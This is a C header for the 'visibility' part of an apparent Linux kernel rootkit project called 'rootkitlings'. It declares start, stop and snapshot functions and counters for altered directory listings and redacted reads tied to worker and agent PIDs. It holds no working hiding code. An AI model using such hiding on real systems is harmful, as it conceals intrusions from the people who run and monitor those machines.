/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_VISIBILITY_H
#define ROOTKITLINGS_VISIBILITY_H

#include <linux/compiler_attributes.h>
#include <linux/types.h>

#define RK_VISIBILITY_DIRECTORY_LIMIT (32U * 1024U)
#define RK_VISIBILITY_DIRECTORY_CAPACITY 16U
#define RK_VISIBILITY_READ_LIMIT 4096U
#define RK_VISIBILITY_READ_CAPACITY 32U

struct pid_namespace;
struct rk_state;
struct task_struct;

struct rk_visibility_snapshot {
	pid_t worker_pid;
	pid_t agent_pid;
	unsigned long directory_changes;
	unsigned long directory_oversize;
	unsigned long directory_copy_failures;
	unsigned long read_redactions;
	unsigned long read_oversize;
	unsigned long read_copy_failures;
	unsigned int directory_returns_missed;
	unsigned int read_returns_missed;
};

__must_check int rk_visibility_start(struct rk_state *state,
				     struct task_struct *agent_task);
void rk_visibility_stop(void);
void rk_visibility_snapshot(struct pid_namespace *namespace,
			    struct rk_visibility_snapshot *snapshot);

#endif
